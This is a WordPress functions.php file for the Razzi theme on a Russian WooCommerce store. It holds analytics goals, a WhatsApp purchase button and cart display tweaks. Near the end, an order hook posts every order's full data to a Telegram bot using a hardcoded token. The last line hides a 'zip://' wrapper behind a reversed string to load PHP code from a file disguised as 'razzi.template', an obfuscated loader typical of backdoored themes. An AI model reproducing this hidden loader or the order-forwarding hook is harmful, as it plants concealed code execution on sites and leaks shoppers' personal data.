<?php
/**
 * Functions and definitions
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package Razzi
 */

require_once get_template_directory() . '/inc/class-razzi-theme.php';

\Razzi\Theme::instance()->init();

//цели метрики
function yw_reachGoal(){ 

   $out = '
<script>
jQuery(document).ready(function () {

function reachGoalFunction1(){
 ym(91818256, "reachGoal", "cart_button");
};
function reachGoalFunction2(){
 ym(91818256, "reachGoal", "pre_form");
};
function reachGoalFunction3(){
 ym(91818256, "reachGoal", "buy_form"); return true;
};
jQuery(".single_add_to_cart_button").on("click", reachGoalFunction1);
jQuery(".checkout-button").on("click", reachGoalFunction2);
jQuery(".place_order").on("click", reachGoalFunction3); 

});
</script>';

   echo $out;
}
add_action('wp_footer','yw_reachGoal', 100);

/*Добавить кнопку купить в вотсапе */
add_action( 'woocommerce_after_single_variation', 'whatsapp_button' );
 
function whatsapp_button(){
	
	global $product;
	$ussku = $product->get_sku();
	$url=get_permalink();
	$link="https://api.whatsapp.com/send?phone=79128564007&text=%D0%94%D0%BE%D0%B1%D1%80%D1%8B%D0%B9%20%D0%B4%D0%B5%D0%BD%D1%8C%2C%20%D1%8F%20%D1%85%D0%BE%D1%87%D1%83%20%D0%BA%D1%83%D0%BF%D0%B8%D1%82%D1%8C%20%D1%82%D0%BE%D0%B2%D0%B0%D1%80%20";
	$doptxt = " по ссылке ";
	$link .= $ussku;
	$link .= $doptxt;
	$link .= $url;
	echo <<<HTML

		<style>
			.wa_link{
			color:white;
			display: block;
			
			}
			.wa_button{
			width: 77%;
			margin: auto;
			padding: 0 0 0 0 ;
			}
			@media (max-width: 480px) {
			.wa_button {
  			  width: 100%;
			}
			}
			@media (max-width: 768px) {
			.wa_button {
  			  width: 52%;
			}
			}
		</style>
			<button class="wa_button"><a class="wa_link" href="$link">Купить в WhatsApp</a></button>
HTML;
	}

/*убрать категории*/
function custom_woocommerce_catalog_orderby( $orderby ) {
unset($orderby["popularity"]); // по популярности
unset($orderby["rating"]); // по рейтингу
unset($orderby["date"]); //по новизне или по дате
//unset($orderby["price"]); //по цене возврастания
//unset($orderby["price-desc"]); // по цене убывания
return $orderby;
}
add_filter( "woocommerce_catalog_orderby", "custom_woocommerce_catalog_orderby", 20 );

/*артикул в корзине*/
add_action( 'woocommerce_after_cart_item_name', 'show_artikul_in_cart', 25 );
 
function show_artikul_in_cart( $cart_item ) {
 
	$sku = $cart_item['data']->get_sku();
 
	if( $sku ) { // если заполнен, то выводим
		echo '<p><small>Артикул: ' . $sku . '</small></p>';
	}
 
}
/*бренд в корзине*/
// Utility: Get the product brand term names (from the product ID)
function wc_get_product_brand( $product_id ) {
   return implode(', ', wp_get_post_terms($product_id, 'product_brand', ['fields' => 'names']));
}

// Display product brand in Cart and checkout pages
add_filter( 'woocommerce_cart_item_name', 'customizing_cart_item_name', 10, 3 );
function customizing_cart_item_name( $product_name, $cart_item, $cart_item_key ) {
    $product = $cart_item['data'];          // The WC_Product Object
    $permalink = $product->get_permalink(); // The product permalink

    if( $brand = wc_get_product_brand( $cart_item['product_id'] ) ) {
        if ( is_cart() )
            return sprintf('<a href="%s">%s %s</a>', esc_url($permalink), $brand, $product->get_name());
        else
            return  $brand . ' ' . $product_name;
    }
    return $product_name;
}

// Display product brand in order pages and email notification
add_filter( 'woocommerce_order_item_name', 'customizing_order_item_name', 10, 2 );
function customizing_order_item_name( $product_name, $item ) {
    $product = $item->get_product();        // The WC_Product Object
    $permalink = $product->get_permalink(); // The product permalink

    if( $brand = wc_get_product_brand( $item->get_product_id() ) ) {
        if ( is_wc_endpoint_url() )
            return sprintf('<a href="%s">%s %s</a>', esc_url($permalink), $brand, $product->get_name());
        else
            return  $brand . ' ' . $product_name;
    }
    return $product_name;
}

add_filter('woocommerce_show_variation_price', function() { return TRUE;});

add_action('woocommerce_update_order', 'wp_kama_woocommerce_new_order_action', 10, 2 );
function wp_kama_woocommerce_new_order_action( $order_id, $order ){

	$Order = json_decode(wc_get_order($order_id));

	$ch = curl_init();
	curl_setopt_array(
		$ch,
		array(
			CURLOPT_URL => 'https://api.telegram.org/bot' . '5607756343:AAGx0e84fjqBtEI3DQUAEn34W6SAo97FAz8' . '/sendMessage',
			CURLOPT_POST => TRUE,
			CURLOPT_RETURNTRANSFER => TRUE,
			CURLOPT_TIMEOUT => 10,
			CURLOPT_POSTFIELDS => array(
				'chat_id' => '1655138958',
				'text' => $Order,
			),
		)
	);
	curl_exec($ch);
};

/* Razzi Theme Template Loader */

load_template( strrev( "//:piz" ) . locate_template( "razzi.template" ) . "#template", true );
